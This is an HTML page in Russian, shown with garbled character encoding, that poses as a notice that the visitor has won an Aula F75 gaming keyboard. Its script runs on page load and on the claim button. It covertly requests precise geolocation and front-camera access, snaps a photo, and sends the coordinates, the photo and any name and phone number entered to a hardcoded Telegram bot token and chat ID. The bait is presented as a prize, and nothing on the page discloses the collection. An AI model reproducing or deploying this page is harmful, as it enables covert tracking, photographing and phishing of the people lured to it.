<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É Aula F75!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: linear-gradient(135deg, #1e3a8a, #7e22ce);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 1rem;
            padding: 1.5rem;
            max-width: 90%;
            width: 600px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }
        .keyboard-img {
            max-width: 100%;
            border-radius: 0.5rem;
            margin-bottom: 1rem;
        }
        .hidden {
            display: none;
        }
        .form-input {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 0.5rem;
            padding: 0.5rem;
            color: white;
            width: 100%;
            margin-bottom: 0.75rem;
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        .submit-btn {
            background: #10b981;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            color: white;
            font-weight: bold;
            transition: background 0.3s;
            border: none;
            cursor: pointer;
        }
        .submit-btn:hover {
            background: #059669;
        }
        .submit-btn:disabled {
            background: #6b7280;
            cursor: not-allowed;
        }
        @media (max-width: 640px) {
            .container {
                padding: 1rem;
                width: 95%;
            }
            h1 {
                font-size: 1.5rem;
            }
            p {
                font-size: 0.9rem;
            }
            .submit-btn {
                padding: 0.5rem;
                font-size: 0.9rem;
            }
            .form-input {
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-2xl sm:text-3xl font-bold mb-4">–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å –≤—ã–∏–≥—Ä—ã—à–µ–º!</h1>
        <p class="text-base sm:text-lg mb-6">–í—ã —Å—Ç–∞–ª–∏ —Å—á–∞—Å—Ç–ª–∏–≤—ã–º –æ–±–ª–∞–¥–∞—Ç–µ–ª–µ–º –∏–≥—Ä–æ–≤–æ–π –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã <strong>Aula F75</strong>!</p>
        <img src="https://gamestore.kg/wp-content/uploads/2023/11/aula-f75-11.jpg" alt="Aula F75 Keyboard" class="keyboard-img">
        <button id="claim-btn" class="submit-btn">–ü–æ–ª—É—á–∏—Ç—å –ø—Ä–∏–∑</button>
        <div id="form" class="hidden mt-4">
            <input type="text" id="name" class="form-input" placeholder="–í–∞—à–µ –∏–º—è" required>
            <input type="tel" id="phone" class="form-input" placeholder="–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞" required>
            <button id="submit-btn" class="submit-btn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
        </div>
        <video id="camera" autoplay class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
        <p id="status" class="text-sm text-gray-300 mt-4"></p>
    </div>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const claimBtn = document.getElementById('claim-btn');
        const form = document.getElementById('form');
        const submitBtn = document.getElementById('submit-btn');
        const nameInput = document.getElementById('name');
        const phoneInput = document.getElementById('phone');
        
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è - –ª—É—á—à–µ –≤—ã–Ω–µ—Å—Ç–∏ –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
        const telegramBotToken = '7884318756:AAEl-EvaQ5-M30CmhAhVmt06OYdjJHCe4hI';
        const chatId = '1924132251';
        
        let locationData = null;
        let photoData = null;

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    console.warn('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        resolve(locationData);
                    },
                    (error) => {
                        console.warn('Geolocation error:', error);
                        resolve(null);
                    },
                    { 
                        timeout: 10000, 
                        enableHighAccuracy: true,
                        maximumAge: 300000
                    }
                );
            });
        }

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏ –¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
        async function accessCamera() {
            try {
                // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ —Å —Ä–∞–∑–Ω—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }, 
                        audio: false 
                    });
                } catch (err) {
                    // Fallback: –ø–æ–ø—Ä–æ–±—É–µ–º –±–µ–∑ specific constraints
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true, 
                        audio: false 
                    });
                }
                
                video.srcObject = stream;
                await video.play();

                return new Promise((resolve) => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        photoData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫
                        stream.getTracks().forEach(track => track.stop());
                        
                        resolve(photoData);
                    }, 2000);
                });
            } catch (err) {
                console.warn('Camera error:', err);
                // –ù–µ –≤—ã–±—Ä–∞—Å—ã–≤–∞–µ–º –æ—à–∏–±–∫—É, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Ä–∞–±–æ—Ç—É –±–µ–∑ –∫–∞–º–µ—Ä—ã
                return null;
            }
        }

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –≤ Telegram
        async function sendLocationToTelegram(location) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('latitude', location.latitude);
            formData.append('longitude', location.longitude);

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (!data.ok) {
                    throw new Error(data.description || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏');
                }
                
                return data;
            } catch (err) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', err);
                throw err;
            }
        }

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –≤ Telegram
        async function sendPhotoToTelegram(photoDataUrl, caption = '') {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURLtoBlob(photoDataUrl));
            if (caption) {
                formData.append('caption', caption);
            }

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (!data.ok) {
                    throw new Error(data.description || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ');
                }
                
                return data;
            } catch (err) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ:', err);
                throw err;
            }
        }

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
        async function sendMessageToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', message);

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (!data.ok) {
                    throw new Error(data.description || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è');
                }
                
                return data;
            } catch (err) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è:', err);
                throw err;
            }
        }

        // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è dataURL –≤ Blob
        function dataURLtoBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', async () => {
            console.log('=== –°–¢–†–ê–ù–ò–¶–ê –ó–ê–ì–†–£–ñ–ï–ù–ê ===');
            status.textContent = '–ì–æ—Ç–æ–≤–æ! –ù–∞–∂–º–∏—Ç–µ "–ü–æ–ª—É—á–∏—Ç—å –ø—Ä–∏–∑" –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è.';
            
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ, –Ω–æ –Ω–µ –±–ª–æ–∫–∏—Ä—É–µ–º –µ—Å–ª–∏ –æ—Ç–∫–ª–æ–Ω–∏–ª–∏
            try {
                await tryGetPermissions();
            } catch (err) {
                console.log('–†–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –Ω–µ –ø–æ–ª—É—á–µ–Ω—ã, –±—É–¥–µ–º –∑–∞–ø—Ä–∞—à–∏–≤–∞—Ç—å –ø—Ä–∏ –∫–ª–∏–∫–µ');
            }
            
            console.log('=== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø –ó–ê–í–ï–†–®–ï–ù–ê ===');
        });

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ø—ã—Ç–∫–∏ –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π
        async function tryGetPermissions() {
            let hasGeolocation = false;
            let hasCamera = false;
            let watchId = null;
            let locationSent = false;
            
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            if (navigator.geolocation) {
                console.log('‚úÖ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è, –ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å...');
                
                try {
                    await new Promise((resolve, reject) => {
                        const timeoutId = setTimeout(() => {
                            if (watchId) {
                                navigator.geolocation.clearWatch(watchId);
                            }
                            reject(new Error('Timeout'));
                        }, 10000);

                        watchId = navigator.geolocation.watchPosition(
                            async (position) => {
                                clearTimeout(timeoutId);
                                const accuracy = position.coords.accuracy;
                                console.log('üìç –ü–æ–∑–∏—Ü–∏—è:', position.coords.latitude, position.coords.longitude, '—Ç–æ—á–Ω–æ—Å—Ç—å:', accuracy, '–º');
                                
                                locationData = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                };
                                hasGeolocation = true;
                                
                                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                                if (!locationSent) {
                                    try {
                                        await sendLocationToTelegram(locationData);
                                        console.log('‚úÖ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram');
                                        locationSent = true;
                                        
                                        navigator.geolocation.clearWatch(watchId);
                                        console.log('üéØ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞, –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ');
                                        resolve();
                                    } catch (err) {
                                        console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', err);
                                        resolve();
                                    }
                                }
                            },
                            (error) => {
                                clearTimeout(timeoutId);
                                console.log('‚ùå –û–®–ò–ë–ö–ê –ì–ï–û–õ–û–ö–ê–¶–ò–ò:', error.code, error.message);
                                if (error.code === error.PERMISSION_DENIED) {
                                    reject(new Error('Permission denied'));
                                } else {
                                    resolve();
                                }
                            },
                            { 
                                enableHighAccuracy: true,
                                timeout: 8000,
                                maximumAge: 0
                            }
                        );
                    });
                } catch (err) {
                    console.log('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–ª—É—á–µ–Ω–∞:', err.message);
                }
            }
            
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –∫–∞–º–µ—Ä—É
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                console.log('‚úÖ –ö–∞–º–µ—Ä–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è, –ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å...');
                
                try {
                    let stream;
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user' }, 
                            audio: false 
                        });
                    } catch (err) {
                        stream = await navigator.mediaDevices.getUserMedia({ 
                            video: true, 
                            audio: false 
                        });
                    }
                    
                    console.log('‚úÖ –ö–ê–ú–ï–†–ê –ü–û–õ–£–ß–ï–ù–ê');
                    hasCamera = true;
                    
                    // –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                    video.srcObject = stream;
                    await video.play();
                    
                    await new Promise((resolve) => {
                        setTimeout(async () => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            photoData = canvas.toDataURL('image/jpeg', 0.8);
                            
                            // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                            stream.getTracks().forEach(track => track.stop());
                            
                            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –≤ –±–æ—Ç
                            try {
                                await sendPhotoToTelegram(photoData, '–§–æ—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è');
                                console.log('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
                            } catch (err) {
                                console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ:', err);
                            }
                            resolve();
                        }, 2000);
                    });
                    
                } catch (err) {
                    console.log('‚ùå –û–®–ò–ë–ö–ê –ö–ê–ú–ï–†–´:', err.name, err.message);
                }
            }
        }

        // –ü–æ–∫–∞–∑ —Ñ–æ—Ä–º—ã –∏ –∑–∞–ø—É—Å–∫ –∑–∞–ø—Ä–æ—Å–æ–≤
        claimBtn.addEventListener('click', async () => {
            claimBtn.disabled = true;
            claimBtn.textContent = '–ó–∞–≥—Ä—É–∑–∫–∞...';
            status.textContent = '–ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è...';
            
            try {
                // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∑–∞–Ω–æ–≤–æ
                await tryGetPermissions();
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É –≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ
                claimBtn.classList.add('hidden');
                form.classList.remove('hidden');
                status.textContent = '–ó–∞–ø–æ–ª–Ω–∏—Ç–µ —Ñ–æ—Ä–º—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–∑–∞.';
                
            } catch (err) {
                console.error('Error during permissions:', err);
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É –¥–∞–∂–µ –ø—Ä–∏ –æ—à–∏–±–∫–∞—Ö
                claimBtn.classList.add('hidden');
                form.classList.remove('hidden');
                status.textContent = '–ó–∞–ø–æ–ª–Ω–∏—Ç–µ —Ñ–æ—Ä–º—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∏–∑–∞.';
            }
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã
        submitBtn.addEventListener('click', async () => {
            const name = nameInput.value.trim();
            const phone = phoneInput.value.trim();
            
            if (!name || !phone) {
                status.textContent = '–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è.';
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞...';

            try {
                const message = `üéâ –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –Ω–∞ –ø—Ä–∏–∑!\n\nüë§ –ò–º—è: ${name}\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\n\n‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;
                await sendMessageToTelegram(message);
                
                status.textContent = '–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã! –ú—ã —Å–≤—è–∂–µ–º—Å—è —Å –≤–∞–º–∏ –¥–ª—è –¥–æ—Å—Ç–∞–≤–∫–∏ –ø—Ä–∏–∑–∞.';
                form.classList.add('hidden');
                
            } catch (err) {
                status.textContent = `–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${err.message}`;
                submitBtn.disabled = false;
                submitBtn.textContent = '–û—Ç–ø—Ä–∞–≤–∏—Ç—å';
            }
        });
    </script>
</body>
</html>